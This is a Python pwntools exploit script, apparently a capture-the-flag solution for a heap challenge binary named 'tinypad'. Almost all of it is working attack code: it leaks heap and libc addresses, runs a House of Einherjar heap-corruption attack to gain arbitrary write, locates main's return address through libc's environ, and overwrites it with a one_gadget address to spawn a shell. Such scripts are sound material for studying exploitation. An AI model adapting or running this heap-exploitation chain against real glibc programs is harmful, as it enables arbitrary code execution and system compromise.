# -*- coding:utf-8 -*-
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']
name = './tinypad'
r = process(name)

libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
def attach_and_debug():
    print(str(r.proc.pid))
    gdb.attach(r, """
    echo  br  *0x0000000000400e67\\n
    heap
    echo x/40gx 0x603000\\n
    x/50gx 0x602040
    """);
    print(str(r.proc.pid))

    r.interactive()

def add(size, data):
    r.recvuntil("(CMD)>>> ")
    r.sendline('a')
    r.recvuntil("(SIZE)>>> ")
    r.sendline(str(size))
    r.recvuntil("(CONTENT)>>> ")
    r.send(data)

def d(index):
    r.recvuntil("(CMD)>>> ")
    r.sendline('d')
    r.recvuntil("(INDEX)>>> ")
    r.sendline(str(index))

def edit(index, data):
    r.recvuntil("(CMD)>>> ")
    r.sendline('e')
    r.recvuntil("(INDEX)>>> ")
    r.sendline(str(index))
    r.recvuntil("(CONTENT)>>> ")
    r.send(data)
    r.recvuntil("(Y/n)>>")
    r.sendline("Y")


add(0x88,'A\n')
add(0xf8,'B\n')
add(0x80,'C\n')
add(0x80,'D'*0x80+'\n')

d(3)
d(1)

# 1. leak
r.recvuntil(" #   INDEX: 1")
r.recvuntil(" # CONTENT: ")
heap_base = u64(r.recvuntil('\n').strip('\x0a').ljust(8, '\0'))-0x120-0x70
print("heap_base: ", hex(heap_base))

r.recvuntil(" #   INDEX: 3")
r.recvuntil(" # CONTENT: ")
libc_base = u64(r.recv(6).ljust(8, '\0')) -  0x3c4b78
print("libc_base: ", hex(libc_base))

# attach_and_debug();pause()


# pwndbg> p/x 0x7ffff7dd3f38- 0x7ffff7a0d000
# $3 = 0x3c6f38

malloc_hook = 0x3c4b10 + libc_base 
environ = 0x3c6f38+libc_base 

# 2. house_of_einherjar

offset = heap_base+0x90-0x602060

payload = ''
payload += 'a'*16
payload += 'a'*16
payload += 'a'*8 +  p64(offset) 
payload += p64(0x602060) +  p64(0x602060) 
payload += p64(0x602060) +  p64(0x602060) 
edit(4, payload+'\n')

add(0x80,'c\n') # memo1(old3)

payload = ''
payload += '1'*0x80
payload += p64(offset)
add(0x88,payload +'\n') # memo 3(old 1)

d(2)
# attach_and_debug();pause()

payload = ''
payload += p64(0) +  p64(0) 
payload += p64(0) +  p64(0) 
payload += p64(0) +  p64(0x111) 
edit(4, payload+'\n')

payload = ''
payload += 0xd0*'a'
payload += 'a'*8 + p64(environ)
payload += 'a'*8 + p64(environ)
payload += 'a'*8 + p64(0x602140)
add(256, payload+'\n')

r.recvuntil(" #   INDEX: 1")
r.recvuntil(" # CONTENT: ")
environ_addr = u64(r.recv(6).ljust(8, '\0')) 
main_ret_addr = environ_addr- 0xf0
print("environ_addr: ", hex(environ_addr)) 
print("main_ret_addr: ", hex(main_ret_addr)) 
# attach_and_debug();pause()
payload = 'D'*8 +p64(main_ret_addr).strip('\0')
# payload = 'D'*8 +'\x18\xdc\xff\xff\xff\x7f'
# payload = 'D'*8 +'\xe8\xdb\xff\xff\xff\x7f'
# payload = 'D'*8 +'AB'
# payload += 30*p64(0x41)
# payload += 31*8*'A'+p64(main_ret_addr)
edit(3, payload+'\n')

one_gadget_addr = libc_base + 0x45216

edit(1, p64(one_gadget_addr)+'\n')

attach_and_debug()